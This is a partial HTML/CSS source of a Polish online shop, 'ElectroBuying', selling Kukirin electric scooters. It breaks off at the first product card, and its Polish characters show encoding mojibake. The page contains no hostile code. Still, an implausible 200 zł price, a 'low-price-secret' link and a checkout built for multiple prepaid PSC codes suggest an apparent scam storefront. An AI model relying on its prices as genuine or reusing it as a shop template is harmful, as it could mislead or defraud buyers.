<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ElectroBuying - Hulajnogi Elektryczne Kukirin</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>üõ¥</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            line-height: 1.6;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 25%, #16213e 50%, #0f3460 75%, #0e2954 100%);
            min-height: 100vh;
            scroll-behavior: smooth;
            color: white;
        }

        /* Navigation */
        nav {
            position: fixed;
            top: 0;
            width: 100%;
            background: rgba(10, 10, 10, 0.9);
            backdrop-filter: blur(30px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            z-index: 1000;
            padding: 1rem 0;
            transition: all 0.3s ease;
            display: flex; /* Make nav a flex container */
            justify-content: center; /* Center its content */
            align-items: center;
        }

        .nav-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between; /* Space out logo, hamburger, cart */
            align-items: center;
            padding: 0 2rem;
            width: 100%; /* Ensure it takes full width of nav */
        }

        .logo {
            font-size: 2.2rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00d4ff, #7c3aed, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
        }

        /* New container for hamburger and cart on mobile */
        .nav-controls {
            display: flex;
            align-items: center;
            gap: 1rem; /* Space between hamburger and cart */
        }

        /* Hamburger menu button - hidden by default on desktop */
        .hamburger-menu {
            display: none; /* Hidden on desktop */
            background: none;
            border: none;
            color: white;
            font-size: 2rem;
            cursor: pointer;
            z-index: 1001;
            padding: 0.5rem;
            transition: color 0.3s ease;
        }

        .hamburger-menu:hover {
            color: #00d4ff;
        }

        /* Default desktop nav links */
        .nav-links {
            display: flex; /* Always flex for desktop */
            gap: 2rem;
            list-style: none;
            align-items: center;
            /* No position absolute or transform here for desktop */
        }

        .nav-links a {
            color: rgba(255, 255, 255, 0.9);
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s ease;
            padding: 0.5rem 1rem;
            border-radius: 25px;
            position: relative;
            overflow: hidden;
        }

        .nav-links a:hover {
            color: #00d4ff;
            transform: translateY(-2px);
            background: rgba(255, 255, 255, 0.1);
        }

        .cart-icon {
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            color: white;
            padding: 0.8rem;
            border-radius: 50%;
            cursor: pointer;
            font-size: 1.2rem;
            transition: all 0.3s ease;
            position: relative;
            border: none;
        }

        .cart-icon:hover {
            transform: translateY(-2px) scale(1.05);
            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.3);
            background: linear-gradient(135deg, #7c3aed, #00d4ff); /* Glaze effect on hover */
        }

        .cart-icon.animate {
            animation: cartPop 0.3s ease-out;
        }

        @keyframes cartPop {
            0% { transform: scale(1); }
            50% { transform: scale(1.7); } /* 70% enlargement */
            100% { transform: scale(1); }
        }

        .cart-count {
            position: absolute;
            top: -5px;
            right: -5px;
            background: #ec4899;
            color: white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
            font-weight: 700;
        }

        /* Hero Section */
        .hero {
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
            background: 
                radial-gradient(circle at 20% 80%, rgba(124, 58, 237, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(0, 212, 255, 0.3) 0%, transparent 50%),
                linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 25%, #16213e 50%, #0f3460 75%, #0e2954 100%);
            position: relative;
            overflow: hidden;
        }

        .hero::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 25% 25%, rgba(124, 58, 237, 0.1) 0%, transparent 40%),
                radial-gradient(circle at 75% 75%, rgba(0, 212, 255, 0.1) 0%, transparent 40%);
            animation: pulse 4s ease-in-out infinite alternate;
        }

        @keyframes pulse {
            0% { opacity: 0.3; }
            100% { opacity: 0.7; }
        }

        .hero-content {
            z-index: 2;
            position: relative;
            max-width: 800px;
            margin: 0 auto;
            padding: 0 2rem;
        }

        .hero h1 {
            font-size: 5rem;
            font-weight: 900;
            margin-bottom: 1.5rem;
            background: linear-gradient(135deg, #00d4ff 0%, #7c3aed 50%, #ec4899 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 50px rgba(0, 212, 255, 0.3);
            animation: glow 3s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.3)); }
            to { filter: drop-shadow(0 0 40px rgba(124, 58, 237, 0.5)); }
        }

        .hero-subtitle {
            font-size: 1.8rem;
            margin-bottom: 1rem;
            font-weight: 300;
            opacity: 0.9;
            letter-spacing: 0.5px;
        }

        .hero p {
            font-size: 1.3rem;
            margin-bottom: 3rem;
            opacity: 0.8;
            font-weight: 400;
            line-height: 1.8;
        }

        .cta-button {
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            color: white;
            padding: 1.2rem 3rem;
            border: none;
            border-radius: 50px;
            font-size: 1.3rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-decoration: none;
            display: inline-block;
            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
            position: relative;
            overflow: hidden;
        }

        .cta-button:hover {
            transform: translateY(-5px) scale(1.05);
            box-shadow: 0 20px 50px rgba(124, 58, 237, 0.4);
        }

        /* Container */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }

        /* Section Styles */
        section {
            padding: 5rem 0;
            margin: 2rem 0;
        }

        .section-title {
            text-align: center;
            font-size: 3.5rem;
            font-weight: 900;
            margin-bottom: 4rem;
            color: white;
            background: linear-gradient(135deg, #00d4ff, #7c3aed, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            position: relative;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 100px;
            height: 4px;
            background: linear-gradient(90deg, #00d4ff, #7c3aed);
            border-radius: 2px;
        }

        /* Products Section */
        .products-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
            gap: 2.5rem;
            margin-top: 4rem;
        }

        .product-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(30px);
            border-radius: 25px;
            padding: 2.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.4s ease;
            color: white;
            position: relative;
            overflow: hidden;
            cursor: pointer;
        }

        .product-card:hover {
            transform: translateY(-15px);
            border-color: rgba(0, 212, 255, 0.3);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3);
            background: rgba(255, 255, 255, 0.08);
        }

        .product-image-wrapper {
            width: 100%;
            height: 220px;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            border-radius: 20px;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .product-image-wrapper img {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Ensures the image covers the area, cropping if necessary */
            transition: transform 0.3s ease;
        }

        .product-card:hover .product-image-wrapper img {
            transform: scale(1.05);
        }

        /* New styles for product icons in main grid and modal */
        .product-icon-display {
            font-size: 4rem; /* Large emoji size */
            color: #00d4ff; /* Icon color */
            text-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
        }
        .product-icon-display .product-icon {
            display: block; /* Ensure emoji is centered */
        }


        .product-name {
            font-size: 1.6rem;
            font-weight: 700;
            margin-bottom: 0.8rem;
            color: white;
        }

        .product-price {
            font-size: 2.2rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 1.5rem;
        }

        .product-price.discounted {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .old-price {
            font-size: 1.2rem;
            color: rgba(255, 255, 255, 0.5);
            text-decoration: line-through;
            font-weight: 500;
        }

        .discount-badge {
            background: linear-gradient(135deg, #ec4899, #f59e0b);
            color: white;
            padding: 0.3rem 0.8rem;
            border-radius: 15px;
            font-size: 0.8rem;
            font-weight: 700;
        }

        .product-description {
            opacity: 0.8;
            margin-bottom: 2rem;
            line-height: 1.7;
            font-weight: 400;
        }

        .buy-button {
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            color: white;
            padding: 1rem 2rem;
            border: none;
            border-radius: 25px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            font-size: 1.1rem;
            position: relative;
            overflow: hidden;
        }

        .buy-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
        }

        /* Modal Styles (Product Details) */
        .modal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px); /* Blur effect for background */
            overflow: auto; /* Allow modal itself to scroll if content is too large for viewport */
        }

        .modal-content {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            margin: 2.5% auto; /* Centered, almost full screen */
            padding: 3rem;
            border-radius: 25px;
            width: 95%;
            max-width: 1000px; /* Larger max-width */
            min-height: 80vh; /* Minimum height */
            max-height: 95vh; /* Max height to prevent overflow */
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            display: flex;
            flex-direction: column;
            overflow-y: auto; /* Content inside modal scrolls */
            -ms-overflow-style: none;  /* IE and Edge */
            scrollbar-width: none;  /* Firefox */
        }
        .modal-content::-webkit-scrollbar {
            display: none; /* Chrome, Safari, Opera */
        }

        .close {
            color: rgba(255, 255, 255, 0.7);
            float: right;
            font-size: 2.5rem; /* Larger close button */
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            position: absolute;
            top: 1.5rem;
            right: 2rem;
        }

        .close:hover {
            color: #00d4ff;
            transform: scale(1.2);
        }

        .modal h2 {
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 3rem; /* Larger title */
            margin-bottom: 2rem;
            font-weight: 800;
            text-align: center;
        }

        .modal-product-info {
            display: flex;
            flex-wrap: wrap;
            gap: 2rem;
            margin-bottom: 3rem;
        }

        .modal-product-image-wrapper {
            flex: 1;
            min-width: 300px;
            height: 300px;
            background: linear-gradient(135deg, #0f3460, #1a1a2e);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        /* Removed img specific styles from modal-product-image-wrapper to allow icon display */
        /* .modal-product-image-wrapper img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            background-color: #1a1a2e;
        } */

        .modal-product-details {
            flex: 2;
            min-width: 300px;
        }

        .modal-product-details h3 {
            font-size: 2rem;
            margin-bottom: 1rem;
            color: white;
        }

        .modal-product-details .product-price {
            font-size: 2.5rem;
            margin-bottom: 1.5rem;
        }

        .modal-product-details p {
            opacity: 0.9;
            line-height: 1.7;
            margin-bottom: 2rem;
        }

        .specs-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1.5rem;
            margin-top: 2rem;
            padding: 1rem;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .spec-item {
            background: rgba(255, 255, 255, 0.05);
            padding: 1rem;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .spec-item strong {
            display: block;
            font-size: 0.9rem;
            color: #00d4ff;
            margin-bottom: 0.3rem;
        }

        .spec-item span {
            font-size: 1.1rem;
            font-weight: 600;
            color: white;
        }

        .product-reviews-modal {
            margin-top: 3rem;
            padding-top: 2rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .product-reviews-modal h3 {
            color: #00d4ff;
            margin-bottom: 1.5rem;
            font-size: 2rem;
            text-align: center;
        }

        /* Cart Sidebar */
        .cart-sidebar {
            position: fixed;
            top: 0;
            right: -400px;
            width: 400px;
            height: 100vh;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            backdrop-filter: blur(30px);
            border-left: 1px solid rgba(255, 255, 255, 0.2);
            z-index: 2000;
            transition: right 0.3s ease;
            padding: 2rem;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
        }

        .cart-sidebar.open {
            right: 0;
        }

        .cart-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .cart-title {
            font-size: 1.8rem; /* Larger cart title */
            font-weight: 700;
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .cart-close {
            background: none;
            border: none;
            color: white;
            font-size: 2rem; /* Larger close button */
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .cart-close:hover {
            color: #ec4899;
            transform: scale(1.1);
        }

        .cart-items {
            flex-grow: 1; /* Allow cart items to take available space */
            margin-bottom: 2rem;
        }

        .cart-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.5s ease-out; /* For evaporation animation */
        }

        .cart-item.removing {
            opacity: 0;
            transform: translateY(-20px) scale(0.8);
            filter: blur(5px);
        }

        .cart-item-name {
            font-weight: 600;
            color: white;
            font-size: 1.1rem;
        }

        .cart-item-price {
            color: #00d4ff;
            font-weight: 700;
            font-size: 1.1rem;
        }

        .cart-total {
            font-size: 1.5rem; /* Larger total */
            font-weight: 800;
            text-align: center;
            margin: 2rem 0;
            padding: 1rem;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .checkout-btn {
            width: 100%;
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            color: white;
            padding: 1rem;
            border: none;
            border-radius: 15px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 1rem;
        }

        .checkout-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
        }

        /* Checkout Modal (New) */
        .checkout-modal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            overflow: auto;
        }

        .checkout-modal-content {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            margin: 2.5% auto;
            padding: 3rem;
            border-radius: 25px;
            width: 95%;
            max-width: 700px;
            max-height: 95vh;
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow-y: auto;
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        .checkout-modal-content::-webkit-scrollbar {
            display: none;
        }

        .checkout-modal-content h3 {
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 2.2rem;
            margin-bottom: 2rem;
            text-align: center;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: white;
            font-weight: 500;
            font-size: 0.95rem;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            color: white;
            font-size: 1rem;
            transition: all 0.3s ease;
            -webkit-appearance: none; /* Remove default styling for select */
            -moz-appearance: none;
            appearance: none;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
            background: rgba(255, 255, 255, 0.1);
        }

        .form-group select {
            background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23ffffff%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-6.5%200-12.3%203.2-16.1%208.1-3.8%204.9-4.5%2011.6-2.1%2017.1l139.7%20192c3.8%205.3%2010%208.6%2016.7%208.6s12.9-3.3%2016.7-8.6l139.7-192c2.4-5.5%201.7-12.2-2.1-17.1z%22%2F%3E%3C%2Fsvg%3E');
            background-repeat: no-repeat;
            background-position: right 0.7em top 50%, 0 0;
            background-size: 0.65em auto, 100%;
            padding-right: 2.5em;
        }

        /* Styling for select options */
        .form-group select option {
            background: #1a1a2e; /* Dark background for options */
            color: white;
            padding: 0.5rem;
        }

        .continue-btn, .payment-submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            color: white;
            padding: 1rem;
            border: none;
            border-radius: 15px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 1rem;
        }

        .continue-btn:hover, .payment-submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
        }

        /* Checkout steps styling */
        #shipping-step, #payment-step {
            transition: opacity 0.5s ease-in-out;
        }

        .order-summary {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .order-summary p {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.8rem;
            font-size: 1.1rem;
            color: rgba(255, 255, 255, 0.9);
        }
        .order-summary p:last-child {
            margin-bottom: 0;
            padding-top: 1rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 1.4rem;
            font-weight: 700;
            color: #00d4ff;
        }
        .order-summary span {
            font-weight: 600;
        }

        /* Payment method specific forms */
        .payment-method-form {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 15px;
            padding: 1.5rem;
            margin-top: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .payment-method-form .form-group {
            margin-bottom: 1rem;
        }
        .payment-method-form .message {
            margin-top: 1.5rem;
            padding: 1rem;
            border-radius: 10px;
            text-align: center;
            font-weight: 500;
            line-height: 1.5;
        }
        .payment-method-form .message.info {
            background: rgba(0, 212, 255, 0.1);
            color: #00d4ff;
            border: 1px solid rgba(0, 212, 255, 0.3);
        }
        .payment-method-form .message.error {
            background: rgba(236, 72, 153, 0.1);
            color: #ec4899;
            border: 1px solid rgba(236, 72, 153, 0.3);
        }
        .payment-method-form .message.success {
            background: rgba(124, 237, 58, 0.1);
            color: #7ced3a;
            border: 1px solid rgba(124, 237, 58, 0.3);
        }
        .payment-method-form .message.success span {
            display: block;
            font-size: 0.9em;
            margin-top: 0.5em;
            opacity: 0.8;
        }

        /* PSC specific styles */
        .psc-codes-container {
            margin-bottom: 1rem;
        }
        .psc-code-entry {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 0.8rem;
        }
        .psc-code-entry input {
            flex-grow: 1;
        }
        .add-psc-code-btn {
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            color: white;
            border: none;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            font-size: 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        .add-psc-code-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
        }
        .remove-psc-code-btn {
            background: none;
            border: none;
            color: #ec4899;
            font-size: 1.5rem;
            cursor: pointer;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        .remove-psc-code-btn:hover {
            transform: scale(1.1);
        }


        /* About Section */
        .about {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(30px);
            border-radius: 30px;
            padding: 4rem;
            margin: 3rem 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: white;
        }

        .about-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 4rem;
            align-items: center;
        }

        .about-text h3 {
            font-size: 2.2rem;
            margin-bottom: 1.5rem;
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
        }

        .about-text p {
            font-size: 1.1rem;
            opacity: 0.9;
            line-height: 1.8;
            margin-bottom: 1.8rem;
            font-weight: 400;
        }

        .about-stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 1.5rem;
        }

        .stat-item {
            text-align: center;
            padding: 1.5rem;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }

        .stat-item:hover {
            background: rgba(255, 255, 255, 0.08);
            transform: translateY(-5px);
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .stat-label {
            opacity: 0.8;
            font-size: 1rem;
            font-weight: 500;
            margin-top: 0.5rem;
        }

        /* Reviews Section */
        .reviews {
            padding: 5rem 0;
        }

        .reviews-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 2.5rem;
            margin-top: 4rem;
        }

        .review-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(30px);
            border-radius: 25px;
            padding: 2.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: white;
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }

        .review-card:hover {
            transform: translateY(-10px);
            border-color: rgba(0, 212, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            background: rgba(255, 255, 255, 0.08);
        }

        .stars {
            color: #ffd700;
            font-size: 1.3rem;
            margin-bottom: 1.5rem;
            filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.3));
        }

        .review-text {
            font-style: italic;
            opacity: 0.9;
            margin-bottom: 2rem;
            font-size: 1.1rem;
            line-height: 1.7;
            font-weight: 400;
        }

        .reviewer {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .reviewer-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00d4ff, #7c3aed);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            color: white;
            font-size: 1.5rem;
            box-shadow: 0 5px 15px rgba(0, 212, 255, 0.3);
        }

        .reviewer-info h4 {
            font-weight: 600;
            margin-bottom: 0.3rem;
            font-size: 1.1rem;
        }

        .reviewer-info p {
            opacity: 0.7;
            font-size: 0.9rem;
        }

        /* Load More Button */
        .load-more-container {
            text-align: center;
            margin-top: 3rem;
        }

        .load-more-btn {
            background: linear-gradient(135deg, #7c3aed, #ec4899);
            color: white;
            padding: 1rem 2.5rem;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
        }

        .load-more-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(236, 72, 153, 0.4);
        }

        .hidden {
            display: none;
        }

        /* Scroll to Top Button */
        #scroll-to-top {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, #ec4899, #f59e0b);
            color: white;
            border: none;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            font-size: 1.8rem;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease, transform 0.3s ease;
            z-index: 1000;
            box-shadow: 0 5px 15px rgba(236, 72, 153, 0.4);
        }

        #scroll-to-top.show {
            opacity: 1;
            visibility: visible;
            transform: translateY(0);
        }

        #scroll-to-top:hover {
            transform: translateY(-5px) scale(1.1);
            box-shadow: 0 8px 20px rgba(236, 72, 153, 0.6);
        }

        /* Footer */
        footer {
            background: rgba(0, 0, 0, 0.3);
            color: white;
            text-align: center;
            padding: 3rem 0;
            margin-top: 5rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        /* Mobile specific styles */
        @media (max-width: 768px) {
            .nav-container {
                padding: 0 1rem;
            }

            /* Show hamburger on mobile */
            .hamburger-menu {
                display: block;
            }

            /* Hide desktop nav links on mobile by default, and style for mobile menu */
            .nav-links {
                flex-direction: column;
                position: absolute;
                top: 100%; /* Position below the nav bar */
                left: 0;
                width: 100%;
                background: rgba(10, 10, 10, 0.95);
                backdrop-filter: blur(30px);
                border-top: 1px solid rgba(255, 255, 255, 0.1);
                padding: 0; /* Remove default padding, add to list items */
                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
                transition: transform 0.3s ease-out, opacity 0.3s ease-out, max-height 0.3s ease-out;
                transform: translateY(-100%); /* Start off-screen above */
                opacity: 0;
                pointer-events: none; /* Disable interaction when hidden */
                max-height: 0; /* Collapse height */
                overflow: hidden; /* Hide overflow during transition */
                gap: 0; /* Reset gap for vertical menu */
            }

            .nav-links.open {
                transform: translateY(0); /* Slide into view */
                opacity: 1;
                pointer-events: auto; /* Enable interaction */
                max-height: 500px; /* Sufficiently large height for transition */
                padding: 1rem 0; /* Add padding when open */
            }

            .nav-links li {
                width: 100%;
                text-align: center;
                padding: 0;
            }

            .nav-links a {
                display: block;
                padding: 0.8rem 1rem;
                border-radius: 0;
                width: 100%;
            }

            /* Cart icon is now outside nav-links, so its mobile styling is simpler */
            .cart-icon {
                /* Keep existing cart-icon styles, no need for specific mobile overrides here */
                /* It will be part of .nav-controls flex container */
            }

            .hero h1 {
                font-size: 3rem;
            }

            .hero-subtitle {
                font-size: 1.4rem;
            }

            .about-content {
                grid-template-columns: 1fr;
            }

            .products-grid {
                grid-template-columns: 1fr;
            }

            .about-stats {
                grid-template-columns: 1fr;
            }

            .section-title {
                font-size: 2.5rem;
            }

            .cart-sidebar {
                width: 100%;
                right: -100%;
            }

            .modal-content, .checkout-modal-content {
                width: 95%;
                margin: 2% auto;
                padding: 2rem;
                min-height: unset;
                max-height: 90vh;
            }

            .modal-product-info {
                flex-direction: column;
            }
        }

        /* Scroll animations */
        .fade-in {
            opacity: 0;
            transform: translateY(50px);
            transition: all 0.8s ease;
        }

        .fade-in.visible {
            opacity: 1;
            transform: translateY(0);
        }

        /* Cart Notification */
        .cart-notification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 1rem 2rem;
            border-radius: 10px;
            z-index: 2001;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 0.8rem;
        }

        .cart-notification.show {
            opacity: 1;
            visibility: visible;
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav>
        <div class="nav-container">
            <div class="logo">ElectroBuying</div>
            <div class="nav-controls"> <!-- New container for hamburger and cart -->
                <button class="hamburger-menu" id="hamburger-btn">‚ò∞</button>
                <button class="cart-icon" id="cart-icon-btn" onclick="toggleCart()">
                    üõí
                    <span class="cart-count" id="cart-count">0</span>
                </button>
            </div>
            <ul class="nav-links" id="mobile-nav-links">
                <li><a href="#home">Strona g≈Ç√≥wna</a></li>
                <li><a href="#products">Produkty</a></li>
                <li><a href="#low-price-secret">Niskie Ceny</a></li>
                <li><a href="#about">O nas</a></li>
                <li><a href="#reviews">Opinie</a></li>
            </ul>
        </div>
    </nav>

    <!-- Hero Section -->
    <section id="home" class="hero">
        <div class="hero-content">
            <h1>ElectroBuying</h1>
            <div class="hero-subtitle">Hulajnogi Kukirin - Najlepsza jako≈õƒá</div>
            <p>Odkryj pe≈ÇnƒÖ gamƒô hulajn√≥g elektrycznych Kukirin. Od podstawowych modeli po zaawansowane wersje - znajd≈∫ idealnƒÖ dla siebie!</p>
            <a href="#products" class="cta-button">Poznaj kolekcjƒô Kukirin</a>
        </div>
    </section>

    <!-- Products Section -->
    <section id="products">
        <div class="container">
            <h2 class="section-title fade-in">Hulajnogi Kukirin</h2>
            <div class="products-grid">
                <div class="product-card fade-in" onclick="showProductDetails('g2')">
                    <div class="product-image-wrapper product-icon-display">
                        <span class="product-icon">üõ¥</span>
                    </div>
                    <h3 class="product-name">Kukirin G2</h3>
                    <div class="product-price">200 z≈Ç</div>
                    <p class="product-description">Podstawowy model z potƒô≈ºnym silnikiem 800W, zasiƒôgiem 55km i prƒôdko≈õciƒÖ do 45 km/h. ≈öwietny start z hulajnogami elektrycznymi.</p>
